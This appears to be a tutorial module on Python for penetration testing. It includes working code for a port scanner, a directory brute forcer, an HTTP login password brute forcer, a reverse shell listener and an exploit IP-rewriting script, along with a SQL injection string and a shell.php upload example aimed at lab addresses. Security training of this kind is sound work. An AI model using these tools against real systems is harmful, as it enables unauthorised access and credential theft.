# Supplementary: Python for Cybersecurity

Python is the lingua franca of cybersecurity. Exploits are written in it. Tools are built with it. Automation depends on it. This module covers the Python skills you need as a security professional — from modifying exploits to building your own tools.

---

## Why Python Matters in Cybersecurity

```
1. Most public exploits on ExploitDB are written in Python
2. Automation — scan 1000 hosts instead of 1
3. Custom tooling — build exactly what you need
4. Parsing — extract data from scan results, logs, and captures
5. Impacket, CrackMapExec, BloodHound — major security tools are Python
6. Scripting reverse shells and payloads
7. Interview requirement — almost every security role expects Python
```

---

## Python Fundamentals for Security

### Running Python

```bash
# Interactive
python3

# Run a script
python3 script.py

# Run a one-liner
python3 -c 'print("hello")'

# Check what's installed
pip3 list
```

### Variables and data types

```python
# Strings (used constantly — URLs, payloads, IPs)
target = "192.168.244.132"
payload = "' OR 1=1--"
url = f"http://{target}/login"     # f-string — variables inside strings

# Numbers
port = 80
timeout = 5

# Lists (collections of items)
targets = ["192.168.244.130", "192.168.244.131", "192.168.244.132"]
ports = [22, 80, 443, 445, 8080]

# Dictionaries (key-value pairs)
creds = {"admin": "password123", "root": "toor", "user": "welcome1"}
scan_result = {"ip": "192.168.244.132", "ports": [22, 80], "os": "Linux"}

# Booleans
is_vulnerable = True
has_shell = False
```

### Control flow

```python
# If/else
if port == 80:
    print("HTTP")
elif port == 443:
    print("HTTPS")
else:
    print(f"Unknown port: {port}")

# Loops
for target in targets:
    print(f"Scanning {target}...")

for port in range(1, 1025):       # ports 1-1024
    check_port(target, port)

# While loop
attempts = 0
while attempts < 5:
    try_login(username, password)
    attempts += 1

# List comprehension (build lists efficiently)
open_ports = [p for p in ports if is_open(target, p)]
```

### Functions

```python
def scan_port(target, port, timeout=3):
    """Check if a port is open on the target."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0    # 0 means connection succeeded (port open)
    except:
        return False

# Use it
if scan_port("192.168.244.132", 80):
    print("Port 80 is open!")
```

### File operations

```python
# Read a file
with open("/etc/passwd", "r") as f:
    content = f.read()
    print(content)

# Read line by line
with open("users.txt", "r") as f:
    for line in f:
        username = line.strip()    # remove newline
        print(f"Trying: {username}")

# Write to a file
with open("results.txt", "w") as f:
    f.write("Scan results:\n")
    f.write(f"Target: {target}\n")

# Append to a file
with open("results.txt", "a") as f:
    f.write(f"Port {port}: open\n")
```

### Error handling

```python
try:
    response = requests.get(url, timeout=5)
    print(response.text)
except requests.exceptions.ConnectionError:
    print(f"Can't connect to {url}")
except requests.exceptions.Timeout:
    print(f"Connection timed out")
except Exception as e:
    print(f"Error: {e}")
```

---

## Essential Libraries for Security

### requests — HTTP requests

```bash
pip3 install requests --break-system-packages
```

```python
import requests

# GET request
response = requests.get("http://192.168.244.132")
print(response.status_code)     # 200
print(response.text)            # HTML content
print(response.headers)         # response headers

# POST request (login form)
data = {"username": "admin", "password": "password123"}
response = requests.post("http://192.168.244.132/login", data=data)

# With cookies
session = requests.Session()
session.post("http://target/login", data={"user": "admin", "pass": "pass"})
# Session now has the login cookie
response = session.get("http://target/admin")   # authenticated request

# Ignore SSL errors
response = requests.get("https://target", verify=False)

# Custom headers
headers = {"User-Agent": "Mozilla/5.0", "Authorization": "Bearer TOKEN"}
response = requests.get("http://target/api", headers=headers)

# File upload
files = {"file": open("shell.php", "rb")}
response = requests.post("http://target/upload", files=files)
```

### socket — raw network connections

```python
import socket

# TCP port scanner
def port_scan(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target, port))
        if result == 0:
            # Try to grab the banner
            try:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode().strip()
            except:
                banner = "No banner"
            print(f"Port {port}: OPEN — {banner}")
        sock.close()
    except Exception as e:
        pass

# Scan common ports
target = "192.168.244.132"
for port in [21, 22, 80, 443, 445, 3306, 3389, 5985, 8080]:
    port_scan(target, port)
```

### subprocess — run system commands

```python
import subprocess

# Run a command and capture output
result = subprocess.run(["nmap", "-sV", "192.168.244.132"], capture_output=True, text=True)
print(result.stdout)

# Run a shell command
result = subprocess.run("cat /etc/passwd | grep bash", shell=True, capture_output=True, text=True)
print(result.stdout)

# Run and get live output
process = subprocess.Popen(["ping", "-c", "4", "192.168.244.132"], stdout=subprocess.PIPE, text=True)
for line in process.stdout:
    print(line.strip())
```

### argparse — command-line arguments

```python
import argparse

parser = argparse.ArgumentParser(description="Simple port scanner")
parser.add_argument("-t", "--target", required=True, help="Target IP")
parser.add_argument("-p", "--ports", default="1-1024", help="Port range (default: 1-1024)")
parser.add_argument("-T", "--timeout", type=float, default=2, help="Timeout in seconds")
args = parser.parse_args()

print(f"Scanning {args.target} ports {args.ports} (timeout: {args.timeout}s)")
```

Usage: `python3 scanner.py -t 192.168.244.132 -p 1-1024 -T 1`

---

## Lab: Build Security Tools

### Tool 1: Multi-threaded port scanner

```python
#!/usr/bin/env python3
"""
Fast port scanner using threads.
Usage: python3 scanner.py -t TARGET [-p PORTS] [-T THREADS]
"""
import socket
import argparse
import threading
from queue import Queue

open_ports = []
lock = threading.Lock()

def scan_port(target, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        if result == 0:
            try:
                sock.send(b"\r\n")
                banner = sock.recv(1024).decode().strip()[:50]
            except:
                banner = ""
            with lock:
                open_ports.append((port, banner))
                print(f"  [+] Port {port}: OPEN  {banner}")
        sock.close()
    except:
        pass

def worker(target, timeout, queue):
    while not queue.empty():
        port = queue.get()
        scan_port(target, port, timeout)
        queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="Multi-threaded port scanner")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-p", "--ports", default="1-1024", help="Port range (e.g., 1-1024 or 22,80,443)")
    parser.add_argument("-T", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("--timeout", type=float, default=1, help="Timeout per port")
    args = parser.parse_args()

    # Parse port range
    if "-" in args.ports:
        start, end = args.ports.split("-")
        ports = range(int(start), int(end) + 1)
    else:
        ports = [int(p) for p in args.ports.split(",")]

    print(f"\n[*] Scanning {args.target} ({len(list(ports))} ports, {args.threads} threads)\n")

    queue = Queue()
    for port in ports:
        queue.put(port)

    threads = []
    for _ in range(min(args.threads, len(list(ports)))):
        t = threading.Thread(target=worker, args=(args.target, args.timeout, queue))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()
    
    print(f"\n[*] Scan complete. {len(open_ports)} open ports found.")
    if open_ports:
        print("\nOpen ports:")
        for port, banner in sorted(open_ports):
            print(f"  {port}/tcp  {banner}")

if __name__ == "__main__":
    main()
```

Save as `scanner.py` and run:
```bash
python3 scanner.py -t 192.168.244.132 -p 1-1024 -T 100
python3 scanner.py -t 192.168.244.132 -p 22,80,443,445,8080
```

### Tool 2: Directory brute forcer

```python
#!/usr/bin/env python3
"""
Web directory brute forcer.
Usage: python3 dirbuster.py -u URL -w WORDLIST [-x EXTENSIONS]
"""
import requests
import argparse
import threading
from queue import Queue

found = []
lock = threading.Lock()

def check_path(base_url, path):
    url = f"{base_url.rstrip('/')}/{path}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=False)
        if r.status_code in [200, 301, 302, 403]:
            with lock:
                found.append((url, r.status_code))
                status_text = {200: "OK", 301: "Moved", 302: "Found", 403: "Forbidden"}
                print(f"  [{r.status_code} {status_text.get(r.status_code, '')}] {url}")
    except:
        pass

def worker(base_url, queue):
    while not queue.empty():
        path = queue.get()
        check_path(base_url, path)
        queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="Directory brute forcer")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
    parser.add_argument("-x", "--extensions", default="", help="Extensions (e.g., php,txt,html)")
    parser.add_argument("-T", "--threads", type=int, default=20, help="Threads")
    args = parser.parse_args()

    extensions = [""] + [f".{e}" for e in args.extensions.split(",") if e]

    queue = Queue()
    with open(args.wordlist, "r") as f:
        for line in f:
            word = line.strip()
            if not word or word.startswith("#"):
                continue
            for ext in extensions:
                queue.put(f"{word}{ext}")

    total = queue.qsize()
    print(f"\n[*] Scanning {args.url} ({total} paths, {args.threads} threads)\n")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.url, queue))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()
    print(f"\n[*] Done. {len(found)} paths found.")

if __name__ == "__main__":
    main()
```

Usage:
```bash
python3 dirbuster.py -u http://192.168.244.132 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

### Tool 3: HTTP login brute forcer

```python
#!/usr/bin/env python3
"""
HTTP POST login brute forcer.
Usage: python3 brute_login.py -u URL -U USERNAME -w WORDLIST -f FAIL_STRING
"""
import requests
import argparse

def main():
    parser = argparse.ArgumentParser(description="HTTP login brute forcer")
    parser.add_argument("-u", "--url", required=True, help="Login URL")
    parser.add_argument("-U", "--username", required=True, help="Username to test")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist")
    parser.add_argument("-f", "--fail", required=True, help="String that appears on failed login")
    parser.add_argument("--user-field", default="username", help="Username form field name")
    parser.add_argument("--pass-field", default="password", help="Password form field name")
    args = parser.parse_args()

    print(f"\n[*] Target:   {args.url}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Wordlist: {args.wordlist}\n")

    with open(args.wordlist, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords\n")

    for i, password in enumerate(passwords):
        data = {args.user_field: args.username, args.pass_field: password}
        try:
            r = requests.post(args.url, data=data, timeout=5)
            if args.fail not in r.text:
                print(f"\n[+] SUCCESS! {args.username}:{password}")
                return
            if (i + 1) % 100 == 0:
                print(f"  [{i+1}/{len(passwords)}] Tried: {password}")
        except Exception as e:
            print(f"  [!] Error: {e}")

    print("\n[-] No valid password found.")

if __name__ == "__main__":
    main()
```

Usage:
```bash
python3 brute_login.py -u http://192.168.244.132/sqli/login.php \
    -U admin -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
    -f "Invalid" --user-field user --pass-field pass
```

### Tool 4: Reverse shell handler with auto-upgrade

```python
#!/usr/bin/env python3
"""
Simple reverse shell listener that auto-suggests upgrade commands.
Usage: python3 listener.py -p PORT
"""
import socket
import argparse
import sys
import select

def main():
    parser = argparse.ArgumentParser(description="Reverse shell listener")
    parser.add_argument("-p", "--port", type=int, required=True, help="Port to listen on")
    args = parser.parse_args()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", args.port))
    server.listen(1)

    print(f"[*] Listening on 0.0.0.0:{args.port}")
    print("[*] Waiting for connection...\n")

    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    print(f"[*] Shell upgrade commands:")
    print(f"    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print(f"    Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm")
    print(f"\n{'='*50}\n")

    try:
        while True:
            # Check if there's data from the remote shell
            ready, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
            for s in ready:
                if s == conn:
                    data = conn.recv(4096)
                    if not data:
                        print("\n[!] Connection closed.")
                        return
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                elif s == sys.stdin:
                    cmd = sys.stdin.readline()
                    conn.send(cmd.encode())
    except KeyboardInterrupt:
        print("\n[*] Closing connection.")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    main()
```

### Tool 5: Exploit modifier (search and replace IPs in exploits)

```python
#!/usr/bin/env python3
"""
Quickly modify a downloaded exploit — replace IPs and ports.
Usage: python3 exploit_prep.py -f EXPLOIT_FILE -t TARGET_IP -l LHOST -p LPORT
"""
import argparse
import re

def main():
    parser = argparse.ArgumentParser(description="Prepare exploit files")
    parser.add_argument("-f", "--file", required=True, help="Exploit file")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-l", "--lhost", required=True, help="Your IP (callback)")
    parser.add_argument("-p", "--lport", type=int, default=4444, help="Your port (callback)")
    parser.add_argument("-o", "--output", help="Output file (default: adds _modified)")
    args = parser.parse_args()

    with open(args.file, "r") as f:
        content = f.read()

    # Find existing IPs in the exploit
    ips_found = set(re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', content))
    print(f"\n[*] IPs found in exploit: {ips_found}")
    
    # Common variable patterns to replace
    replacements = {
        # Common target variable patterns
        r'(target\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.target}\\2',
        r'(RHOST\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.target}\\2',
        r'(rhost\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.target}\\2',
        r'(ip\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.target}\\2',
        
        # Common callback variable patterns
        r'(lhost\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.lhost}\\2',
        r'(LHOST\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.lhost}\\2',
        r'(callback\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.lhost}\\2',
        r'(attacker\s*=\s*["\'])[\d.]+(["\'])': f'\\g<1>{args.lhost}\\2',
    }

    modified = content
    changes = 0
    for pattern, replacement in replacements.items():
        modified, n = re.subn(pattern, replacement, modified)
        changes += n

    output_file = args.output or args.file.replace(".", "_modified.", 1)
    with open(output_file, "w") as f:
        f.write(modified)

    print(f"[*] {changes} replacements made")
    print(f"[*] Modified exploit saved to: {output_file}")
    print(f"[*] Review the file before running!")

if __name__ == "__main__":
    main()
```

---

## Python for Exploit Modification

When you download an exploit from searchsploit, you often need to fix it. Common issues:

### Issue 1: Python 2 vs Python 3

```python
# Python 2 syntax that breaks in Python 3:

# print statement → print function
print "hello"              # Python 2
print("hello")             # Python 3

# raw_input → input
name = raw_input("Enter: ")   # Python 2
name = input("Enter: ")       # Python 3

# String/bytes confusion
sock.send("data")              # Python 2 (strings are bytes)
sock.send(b"data")             # Python 3 (must explicitly mark as bytes)
sock.send("data".encode())     # Python 3 (convert string to bytes)

# Integer division
5 / 2 = 2                 # Python 2 (integer division by default)
5 / 2 = 2.5               # Python 3 (float division)
5 // 2 = 2                # Python 3 (explicit integer division)

# urllib
import urllib2                          # Python 2
import urllib.request                   # Python 3
urllib2.urlopen(url)                    # Python 2
urllib.request.urlopen(url)             # Python 3
```

### Issue 2: Missing libraries

```bash
# When you see: ModuleNotFoundError: No module named 'requests'
pip3 install requests --break-system-packages

# Common ones you'll need
pip3 install requests --break-system-packages
pip3 install pycryptodome --break-system-packages
pip3 install impacket --break-system-packages
pip3 install beautifulsoup4 --break-system-packages
```

### Issue 3: Hardcoded values

```python
# The exploit has:
target = "10.10.10.10"
callback = "10.10.14.5"
port = 9001

# Change to YOUR values:
target = "192.168.244.132"
callback = "192.168.244.129"
port = 4444

# OR make it take arguments (better):
import sys
target = sys.argv[1]
callback = sys.argv[2]
port = int(sys.argv[3])
```

---

## Python Virtual Environments

Keep your projects and tools isolated so dependencies don't conflict.

```bash
# Create a virtual environment
python3 -m venv myenv

# Activate it
source myenv/bin/activate
# Prompt changes: (myenv) user@host:~$

# Install packages (only in this environment)
pip install requests impacket

# Deactivate when done
deactivate

# Your system Python is unaffected
```

**When to use venvs:**
- Building a tool with specific dependency versions
- Running an exploit that needs an old library version
- Keeping your system Python clean

**When NOT to bother:**
- Quick one-off scripts
- During the exam (speed matters more than cleanliness)

---

## Quick Reference: Python Patterns for Security

```python
# Make HTTP request and check response
import requests
r = requests.get(f"http://{target}/path")
if "success" in r.text:
    print("Found it!")

# Read a wordlist and try each entry
with open("wordlist.txt") as f:
    for word in f:
        word = word.strip()
        # try word as password, directory, etc.

# Connect to a port and send/receive data
import socket
s = socket.socket()
s.connect((target, port))
s.send(b"data\r\n")
response = s.recv(4096)
s.close()

# Run a system command and capture output
import subprocess
result = subprocess.run(["nmap", "-sV", target], capture_output=True, text=True)
print(result.stdout)

# Parse HTML/XML
from bs4 import BeautifulSoup
soup = BeautifulSoup(html_content, "html.parser")
links = [a["href"] for a in soup.find_all("a", href=True)]

# Encode/decode
import base64
encoded = base64.b64encode(b"payload").decode()
decoded = base64.b64decode(encoded)

import hashlib
md5 = hashlib.md5(b"password").hexdigest()
sha256 = hashlib.sha256(b"password").hexdigest()

# Multi-threading
import threading
from queue import Queue
q = Queue()
for item in items:
    q.put(item)
def worker():
    while not q.empty():
        item = q.get()
        do_something(item)
        q.task_done()
threads = [threading.Thread(target=worker) for _ in range(20)]
for t in threads: t.start()
q.join()
```
